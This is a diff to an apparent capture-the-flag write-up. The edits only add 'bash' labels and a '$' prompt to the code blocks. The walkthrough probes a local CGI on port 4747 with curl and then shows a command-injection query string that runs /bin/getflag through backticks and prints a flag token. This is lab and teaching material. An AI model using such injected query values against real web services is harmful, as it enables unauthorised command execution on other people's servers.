@@ -59,7 +59,7 @@ $ cat /etc/apache2/sites-available/level05.conf
 
 We can try to use the port 4747.
 
-```
+```bash
 $ curl localhost:4747
 
 ```
@@ -67,7 +67,7 @@ $ curl localhost:4747
 We got a newline so we can deduce that the CGI is executed.
 Lets try with a query string who set x.
 
-```
+```bash
 $ curl localhost:4747/?x=hello
 hello
 ```
@@ -75,6 +75,6 @@ hello
 Its working like expected so we can try to inject some code.
 
 ```bash
-curl localhost:4747/?x="\`/bin/getflag\`"
+$ curl localhost:4747/?x="\`/bin/getflag\`"
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
